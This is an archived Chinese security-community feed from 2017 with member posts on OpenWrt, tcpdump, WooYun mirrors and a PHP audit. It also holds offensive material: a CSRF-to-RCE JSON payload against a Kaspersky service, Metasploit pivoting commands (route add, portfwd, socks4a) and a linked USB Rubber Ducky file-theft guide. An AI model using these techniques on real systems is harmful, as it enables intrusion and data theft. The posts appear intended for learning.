里面有个技巧：CSRF to RCE，很低级的漏洞，但威力很大，这种“跨”属于“跨应用”，这类漏洞其实不少。

Payload 如下：

"notifier": {"Actions": [{"Command": "touch /tmp/pepperoni", "EventName": 22, "Enable": true,
"__VersionInfo": "1 0"}]

攻击请求如图所示。攻击的是 9080 端口，利用时只需诱骗目标用户访问一个链接，触发这段攻击请求就可以成功。就是个典型的 CSRF 过程，只是这次“跨应用”了，搞掉了卡巴斯基的反病毒文件服务。

<img src="https://images.xiaomiquan.com/FkXnlZX2teScz5pXL2wXLJ9sut3A?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:tUAmQS9aEnm90U_bQmFSqBc9-yg=" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ on 2017-07-23:

MSF内网渗透系列——穿越边界

前篇系列文章发出以后，很多新接触MSF小伙伴会有疑问:MSF做内网渗透总不能在内网找个机器安装一个MSF吧，这当然是可以的。还有小伙伴想到可以利用proxychain把MSF代理到目标内网，这也没毛病。

下面我就介绍几个MSF自身穿越边界的姿势。

假设我们在VPS上搭建了MSF，已经在目标内网中反弹回了一个meterpreter。那么我们就可以利用这个shell建立一条内网访问通道

情景一：利用MSF扫描目标内网smb_version

pivot是meterpreter最常用的一种代理，可以轻松把你的机器代理到目标内网环境

sessions一下看看我们shell的信息：如下
。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
。msf exploit(web_delivery) > sessions
。
。Active sessions
。===============
。
。  Id  Type                      Information  Connection
。  --  ----                      -----------  ----------
。  1   meterpreter python/linux  user @ test  8.8.8.8:443 -> 101.101.101.101:35272 (10.10.10.10)
。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。

我们发现session的ID为1，内网ip为10.10.10.10

那么就可以在metasploit添加一个路由表，目的是访问10.10.10.11将通过meterpreter的session 1 来访问，如下：
。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
。msf exploit(web_delivery) > route add 10.10.10.11 255.255.255.255 1  //route add  目标i或ip段  掩码  session的ID
。
。[*] Route added
。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。

然后我们就可以：
。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
。msf exploit(web_delivery) > use auxiliary/scanner/smb/smb_version
。
。msf auxiliary(smb_version) > set rhosts 10.10.10.11  //如果想扫面整个C段 set rhosts 10.10.10.11/24
。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。

如果我们想让其他一些工具（如：Nmap）利用该路由表到目标内网搞事情呢？

这里MSF的socks4a模块就可以提供一个监听隧道供其他应用程序访问：auxiliary/server/socks4a

情景二：访问目标内网一个服务器（10.10.10.12）80端口的web应用

我们可以利用meterpreter的portfwd把内网web服务器的80端口转发到我们VPS(8.8.8.8)的8088端口。然后我们就可以通过
[http://8.8.8.8:8088/](http://8.8.8.8:8088/)

访问
[http://10.10.10.12:80](http://10.10.10.12:80)



首先session -i 1进入meterpreter，然后做端口转发，如下：
。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
。msf auxiliary(smb_version) > sessions -i 1
。[*] Starting interaction with 1...
。
。meterpreter > portfwd add -l 8088 -r 192.168.31.169 -p 80
。[*] Local TCP relay created: :8088 <-> 192.168.31.169:80
。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。

后记：在整理这篇文章的时候，就想着出个番外篇，专门整理一下其他穿越边界的各种姿势



...

<img src="https://file.xiaomiquan.com/60/e4/60e47e828e20c259db7e6a604da3964fec6b1c5e5798187d47e63927ae9271a0.jpg" width="25px"/> __大芳的小明。💋__: 有kali linux外网的教程吗。


...

---

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-07-21:


__#姿势#__

 爱折腾之将你的路由器刷成openwrt
爱好安全的同学应该都喜欢折腾，一个不错的折腾方式，将你的路由器系统刷成一个开放式的嵌入式linux发行版。
然后你可以在这个路由器上：
挂在一个轻量型的web服务器、进行脱机下载、FTP服务器、安装去广告插件、科学上网、安装python，如果你的线路支持，还可以进行多拨，增加你的带宽，你可以安装python，只要你脑洞够大，拿来做啥都可以，甚至拿来接收shell。
它是采用opkg的软件包管理技术，类似于CentOS下的yum，可以实现对预编译的二进制软件下载。
说白了它可以让你的路由器变成一个小型的linux工作站，然后又没噪音，耗电量又少，是不是挺有意思！
其实我当初接触linux就是从我家路由器刷机开始的，自己整天百度折腾了一个小博客放在上面，然后用iptables防火墙来管理家里内网，这个过程我慢慢去学linux方面的知识。
不断折腾是学习的最好方式，对知识的记忆是最深刻的。
其实国内大多数智能路由都是从OpenWrt的基础上改的，只是没有开放而已。

开始折腾从百度：“你的路由器型号刷OpenWrt教程" 这个关键字开始。



[http://wiki.openwrt.org/toh/start](http://wiki.openwrt.org/toh/start)

  这里看路由器支持信号列表，基本是智能路由器都可以。

[博客 - UMU Corporation](https://my.oschina.net/umu618/?sort=time&catalog=269802&p=3)

 这个作者写了一系列的折腾日记。

[如何从零开始学习OpenWrt？ - 知乎](https://www.zhihu.com/question/23363243)

  这里有个答案比较全，其中youtube链接上有中文的视频，适合深入。

<img src="https://images.xiaomiquan.com/Fi23xYdja3zhVpZUhC1xx0QNTkds?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:4eNgQNY8Rf6HRWyoaQYrlO9A1GY=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 嘿嘿，如果你有路由器支持双wan，你可以用一个一般的路由器做个无线中继来将你邻居网络共享过来，然后接入到你的一个wan口，实现和你自己的宽带重叠，加大带宽😏，老司机也完全不用自己拉宽带了😜

<img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 曾经有段时间很想用双wan口叠加带宽，后来发现双wan口的家用路由不多，基本上都是企业级的才有，价格不菲啊！

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__: 一般是企业级的才有，便宜的三百多吧

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 赞

<img src="https://file.xiaomiquan.com/66/01/660104bd6b28762521f973581f028cc6e49e98159b6d3614aa96a4d64ee52a33.jpg" width="25px"/> __(月半)Al3x~__ replies to <img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__: 多拔还要看运营商玄学

<img src="https://file.xiaomiquan.com/66/01/660104bd6b28762521f973581f028cc6e49e98159b6d3614aa96a4d64ee52a33.jpg" width="25px"/> __(月半)Al3x~__: 刚刷的梅林7.5，别诱惑我又去刷openwrt😂

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/66/01/660104bd6b28762521f973581f028cc6e49e98159b6d3614aa96a4d64ee52a33.jpg" width="25px"/> __(月半)Al3x~__: 哈哈，梅林7.5没刷过，不是openwrt最有名吗？尽量还是刷大品牌，很多大牛在用，走后门几率小

<img src="https://file.xiaomiquan.com/66/01/660104bd6b28762521f973581f028cc6e49e98159b6d3614aa96a4d64ee52a33.jpg" width="25px"/> __(月半)Al3x~__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 以前刷过openwrt，WiFi模块有点问题，就转回去最慢的netgear固件。等有个副路由再折腾，断网太难受😂

<img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__ replies to <img src="https://file.xiaomiquan.com/66/01/660104bd6b28762521f973581f028cc6e49e98159b6d3614aa96a4d64ee52a33.jpg" width="25px"/> __(月半)Al3x~__: 嗯！成都电信的家用200M光纤可以支持4次同账号拔号，我家猫现在接出来的三条线都是独立拨号，独享带宽的，哇咔咔！😏

<img src="https://file.xiaomiquan.com/32/83/32837e06918b2539595c3ca88be5fe65f6660b8be3ef801f76fce562f37c78c7.jpg" width="25px"/> __kingstone__: 说的我也手痒了


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-21:


__#姿势#__

 在做网络分析这块，推荐最原生的命令 tcpdump

“只要和网络沾边，都可以使用 tcpdump 来排查问题。”

这篇文章作为 tcpdump 指南来说可供参考，虽然来说还是简单点，不过大多时候，我们不是职业做流量分析的，够用：


[tcpdump 指南](https://zzyongx.github.io/blogs/tcpdump-tutorial.html)



我 N 年前因为要调试一套复杂架构的网络问题，第一次上了 tcpdump，并结合 Wireshark 在本机进行可视化分析，效果很直接，一些复杂的问题容易找出本质。



...

<img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: 写的非常好，感谢。

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: 本周刚想发这个😂，我日常用的很多，特别是经常和网络设备打交道

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 哈哈 你继续发你的经验 不冲突

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 会有iptables modsecurity snort这类的分享吗😄

<img src="https://file.xiaomiquan.com/c6/19/c619f2f8272cce087de22a13bf084787e929efee10e32381acfb833c8b9a7b3e.jpg" width="25px"/> __乌鸦__: 分享一种玩法 -w - 
输出pcap流到标准输出，管道或者其他方式实时读取分析
用这种方式写了一些内部协议实时分析的脚本，已经普及到公司开发者使用，反馈不错

<img src="https://file.xiaomiquan.com/c6/19/c619f2f8272cce087de22a13bf084787e929efee10e32381acfb833c8b9a7b3e.jpg" width="25px"/> __乌鸦__: 还有个问题分享下 -s0 参数受tcpdump版本限制。有时候抓不全包。 旧版本0就是65535

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/c6/19/c619f2f8272cce087de22a13bf084787e929efee10e32381acfb833c8b9a7b3e.jpg" width="25px"/> __乌鸦__: 嗯 这个好

<img src="https://file.xiaomiquan.com/1f/94/1f94da2eeb0dc62d310f71b39b6c7bc6763324ffce638c47ee4573c61e04475a.jpg" width="25px"/> __溯流__: 打不开了....


...

---

<img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__ on 2017-07-20:

乌云没有倒下一直都在！ 比较好点网速的的3个站,根据类型漏洞一个个过还是很刺激的，come 
[乌云社区]
[WooYun(白帽子技术社区) -- 网络安全资讯、讨论，跨站师，渗透师，结界师聚集之地又一个有意思...](http://zone.secbug.net/zone/index.html)


[乌云Wiki]
[WooYun WiKi [WooYun WiKi]](http://wiki.secbug.net/)


[乌云漏洞平台+drops]
[乌云网镜像丨乌云知识库丨Wooyun镜像丨乌云漏洞平台](http://wooyun.chamd5.org)





...

<img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__: 原来在这里……谢谢分享！

<img src="https://file.xiaomiquan.com/23/cb/23cbc502bad8ece30efc8aeb0f0d125d08a34c5845eff16d768e543a45acb9a7.jpg" width="25px"/> __liuz__: 容易被和谐

<img src="https://file.xiaomiquan.com/f7/86/f7866da4cf9d4aaa064b179ca9047a4f1b4dbce7532be084ce2be1a0c4bb91ff.jpg" width="25px"/> __Payl0ad__: 竟然有些感动😂

<img src="https://file.xiaomiquan.com/78/e9/78e9ff588e637881e951e6a67a256e8fae0f2bd3cbe34dda75f5839f21405851.jpg" width="25px"/> __吕土金__: 怎么注册乌云？需要先提交漏洞吗？

<img src="https://file.xiaomiquan.com/60/b2/60b27269be5db4df43edc134493a7c84fcd2f5e0ee402c8120ef0c5d2b0969d9.jpg" width="25px"/> __leshack__: 怎么注册呢

<img src="https://file.xiaomiquan.com/e5/95/e595f513a41c7340aa524a0b47d1673c3a698ffa32fa176df0886938c915d91f.jpg" width="25px"/> __Lion💬💬💬__: 如何登录啊

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这些都是镜像，没什么注册不注册的

<img src="https://file.xiaomiquan.com/e5/95/e595f513a41c7340aa524a0b47d1673c3a698ffa32fa176df0886938c915d91f.jpg" width="25px"/> __Lion💬💬💬__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 有些帖子必须登陆有啥方法绕过么，是只能遍历那个数字？

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 楼主误人子弟，明明是镜像，无语

<img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__ replies to <img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 懂的人自然懂，多关注下安全圈吧！

<img src="https://file.xiaomiquan.com/32/83/32837e06918b2539595c3ca88be5fe65f6660b8be3ef801f76fce562f37c78c7.jpg" width="25px"/> __kingstone__: 期待回归

<img src="https://file.xiaomiquan.com/51/d2/51d2c4ce46028b8a20e73e80c24617572fdb4cdf8ee23494fd90f88dbedd9173.jpg" width="25px"/> __Time2AM__: 是不是还有内测版的群

<img src="https://file.xiaomiquan.com/51/d2/51d2c4ce46028b8a20e73e80c24617572fdb4cdf8ee23494fd90f88dbedd9173.jpg" width="25px"/> __Time2AM__: 这个怎么看


...

---

<img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__ on 2017-07-20:

乌云没有倒下一直都在！ 比较好点网速的的3个站,根据类型漏洞一个个过还是很刺激的，come 
[乌云社区]
[WooYun(白帽子技术社区) -- 网络安全资讯、讨论，跨站师，渗透师，结界师聚集之地又一个有意思...](http://zone.secbug.net/zone/index.html)


[乌云Wiki]
[WooYun WiKi [WooYun WiKi]](http://wiki.secbug.net/)


[乌云漏洞平台+drops]
[乌云网镜像丨乌云知识库丨Wooyun镜像丨乌云漏洞平台](http://wooyun.chamd5.org)





...

<img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__: 原来在这里……谢谢分享！

<img src="https://file.xiaomiquan.com/23/cb/23cbc502bad8ece30efc8aeb0f0d125d08a34c5845eff16d768e543a45acb9a7.jpg" width="25px"/> __liuz__: 容易被和谐

<img src="https://file.xiaomiquan.com/f7/86/f7866da4cf9d4aaa064b179ca9047a4f1b4dbce7532be084ce2be1a0c4bb91ff.jpg" width="25px"/> __Payl0ad__: 竟然有些感动😂

<img src="https://file.xiaomiquan.com/78/e9/78e9ff588e637881e951e6a67a256e8fae0f2bd3cbe34dda75f5839f21405851.jpg" width="25px"/> __吕土金__: 怎么注册乌云？需要先提交漏洞吗？

<img src="https://file.xiaomiquan.com/60/b2/60b27269be5db4df43edc134493a7c84fcd2f5e0ee402c8120ef0c5d2b0969d9.jpg" width="25px"/> __leshack__: 怎么注册呢

<img src="https://file.xiaomiquan.com/e5/95/e595f513a41c7340aa524a0b47d1673c3a698ffa32fa176df0886938c915d91f.jpg" width="25px"/> __Lion💬💬💬__: 如何登录啊

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这些都是镜像，没什么注册不注册的

<img src="https://file.xiaomiquan.com/e5/95/e595f513a41c7340aa524a0b47d1673c3a698ffa32fa176df0886938c915d91f.jpg" width="25px"/> __Lion💬💬💬__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 有些帖子必须登陆有啥方法绕过么，是只能遍历那个数字？

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 楼主误人子弟，明明是镜像，无语

<img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__ replies to <img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 懂的人自然懂，多关注下安全圈吧！

<img src="https://file.xiaomiquan.com/32/83/32837e06918b2539595c3ca88be5fe65f6660b8be3ef801f76fce562f37c78c7.jpg" width="25px"/> __kingstone__: 期待回归

<img src="https://file.xiaomiquan.com/51/d2/51d2c4ce46028b8a20e73e80c24617572fdb4cdf8ee23494fd90f88dbedd9173.jpg" width="25px"/> __Time2AM__: 是不是还有内测版的群

<img src="https://file.xiaomiquan.com/51/d2/51d2c4ce46028b8a20e73e80c24617572fdb4cdf8ee23494fd90f88dbedd9173.jpg" width="25px"/> __Time2AM__: 这个怎么看


...

---

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-07-20:

不说啥，集体默哀一分钟😖

<img src="https://images.xiaomiquan.com/FqM3U1syWu3MbPUW4QrPgYFXGtoo?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:uePM5WBDgzHoMuvsUhi_Foetvuw=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/60/e4/60e47e828e20c259db7e6a604da3964fec6b1c5e5798187d47e63927ae9271a0.jpg" width="25px"/> __大芳的小明。💋__: 2016年7月到现在..


...

---

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-07-20:

for some reason，少年，抽个SSR吧

[shadowsocks-rss/readme.md at master · breakwa11/sh...](https://github.com/breakwa11/shadowsocks-rss/blob/master/readme.md)





...

<img src="https://file.xiaomiquan.com/c7/0e/c70e5f97b5bc36fffa24c5b1d92138c1db4dd711c3802fcc6e6eb0aeaac50b03.jpg" width="25px"/> __Ctf__: 与NG版本的有什么区别吗

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ replies to <img src="https://file.xiaomiquan.com/c7/0e/c70e5f97b5bc36fffa24c5b1d92138c1db4dd711c3802fcc6e6eb0aeaac50b03.jpg" width="25px"/> __Ctf__: 带混淆模块

<img src="https://file.xiaomiquan.com/a8/e5/a8e520ddc0380795a717be5786fb508f72525f129774fe85ab05b935830a5cb2.jpg" width="25px"/> __黑白两相望__: ssr目前检测不出来吗？


...

---

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__ on 2017-07-19:


__#姿势#__

 
__#代码审计#__

 
__#漏洞复现#__


这是六月份的一个漏洞，当时漏洞作者直接在自己的blog公布细节了，但是对于初学者来说可能理解起来还是有点吃力，所以我对这个漏洞进行了跟踪复现，希望各位能有所收获。

同样，5.08源码已经作为附件直接上传到小密圈中供各位圈友研究学习。


[有道云笔记](http://note.youdao.com/share/?id=b23849077a8d13edde1838be16a443aa&type=note#/)



如有任何问题，欢迎评论区留言指教。


__分享文件:__
[v5.zip](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


...

<img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__: 不懂PHP的表示还是一脸懵逼……

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__ replies to <img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__: php入门相比于java要简单，可以自己翻php手册学一学。下次分享我打算拿ctf的题目进行讲解，那样会更简单直接。

<img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__: 写的好细

<img src="https://file.xiaomiquan.com/b2/27/b2273c727cd42d41352bd2bb195a82e4d41270073f0e99e7e46ffb1a1566c21f.jpg" width="25px"/> __。__: 一开始不会php，多做ctf题😄php不会就百度 慢慢的就会了😂😂

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__ replies to <img src="https://file.xiaomiquan.com/b2/27/b2273c727cd42d41352bd2bb195a82e4d41270073f0e99e7e46ffb1a1566c21f.jpg" width="25px"/> __。__: 2333，我一开始也是这样的。不过建议还是能系统的把基础的php过一遍，让比赛是温故而知新。

<img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__ replies to <img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__: 好的，忙完最近的事，一定看看“世界上最好的语言”是什么样的！😄

<img src="https://file.xiaomiquan.com/8d/e2/8de2de5d6a1eb3d448658bdd79d07593b0268ecf828399fd6d6a3a2912077290.jpg" width="25px"/> __Shutdown-r__: 在用xdebug来调试的时候我碰到了这种情况：遇到代码做过混淆或者加密的php，xdebug直接崩溃了，大大遇到过这种情况么，有解决的办法么？另外，能不能分享一波审计大牛的博客~😜

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__ replies to <img src="https://file.xiaomiquan.com/8d/e2/8de2de5d6a1eb3d448658bdd79d07593b0268ecf828399fd6d6a3a2912077290.jpg" width="25px"/> __Shutdown-r__: 加密的没法调试，尝试去一些在线解密去混淆的站点试试看能不能还原。至于代码审计牛的博客我倒是有好些，等我抽时间整理出来分享给你们。

<img src="https://file.xiaomiquan.com/8d/e2/8de2de5d6a1eb3d448658bdd79d07593b0268ecf828399fd6d6a3a2912077290.jpg" width="25px"/> __Shutdown-r__ replies to <img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__: 哦哦，好的好的

<img src="https://file.xiaomiquan.com/18/07/1807a5f3cc1660fa383120816e5517bd037e67e99ee21661600f00569282a37e.jpg" width="25px"/> __Long__: 有道云笔记的连接点击不了？

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__ replies to <img src="https://file.xiaomiquan.com/18/07/1807a5f3cc1660fa383120816e5517bd037e67e99ee21661600f00569282a37e.jpg" width="25px"/> __Long__: 打的开呀

<img src="https://file.xiaomiquan.com/18/07/1807a5f3cc1660fa383120816e5517bd037e67e99ee21661600f00569282a37e.jpg" width="25px"/> __Long__: 原因找到了，从小程序入口进入小密圈打不开，从app或者小密圈公众号进去才可以

<img src="https://file.xiaomiquan.com/bd/87/bd872d6bf8f2e37a8687398bc1bc0af07f9b896fc43c3663a77f830db1ac4c5c.jpg" width="25px"/> __ken🐜__ replies to <img src="https://file.xiaomiquan.com/8d/e2/8de2de5d6a1eb3d448658bdd79d07593b0268ecf828399fd6d6a3a2912077290.jpg" width="25px"/> __Shutdown-r__: 法師的審計的好像開源了。可以去看下他的工具


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-18:


__#姿势#__

  使用橡皮鸭 U 盘偷取电脑里的文件


[Stealing Files with the USB Rubber Ducky – USB Exf...](https://hakshop.com/blogs/news/stealing-files-with-the-usb-rubber-ducky-usb-exfiltration-explained)



USB Rubber Ducky 这个 U 盘设备我玩了很久（不仅这个，我有全套），也叫橡皮鸭，来自 Hak5。攻击的本质原理就是 HID 攻击，U 盘会模拟成键盘，发出所有的触发指令都和键盘操作有关。

比如插入 U 盘，不需要任何其他手动操作，就可以植入木马。但是由于是模拟键盘操作，所以会发现打开了一些窗口（比如运行窗口、CMD 等），但是有办法能让这个过程做到尽可能隐蔽。

可以一键植入木马，当然也可以一键偷取目标电脑上的文件，上面分享的那个链接要达到的就是这个目的。

引导完毕，具体过程自己看吧。

顺便说一句，Hak5 的相关安全设备被美国禁止对中国销售，我有渠道可以买，但是没什么必要我懒得去做这个中间人。

再顺便说一句，黑手里的 HID 攻击也可以达到这类效果，我们玩安全得多脑洞、多扩展、多发散...😏

<img src="https://images.xiaomiquan.com/Fo6hCZWyBjpnyV4CAmyUPI0HS54n?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:Yn0sOlDk2uxqDL1J77jkWH-uiy8=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FqflhBrfnOgsZ7O3EQh3PGMcbORG?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:uf2-OgIemafMszYssoSeZbM3MOg=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/Fi0yA_3vqbpX3QPLPPpY1RxD_NU1?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:ImTrBI7ZjXJTD7P07RbdAzQjRfA=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/aa/a5/aaa5edc50f15df8cf529bd4360fedbfada616c8ebc63bd72efe67ba9773f4b02.jpg" width="25px"/> __踏歌行千山__: 淘宝上有卖的

<img src="https://file.xiaomiquan.com/b2/3c/b23c795737adee8dc13ad0c866f32f05b6b4bdd374a2cd62d6fa8eee0396f1a4.jpg" width="25px"/> __K3vi__: 可以在某宝购买MJMCU Digispark 微型arduino开发版自己diy一个hid设备。几块钱就可以了

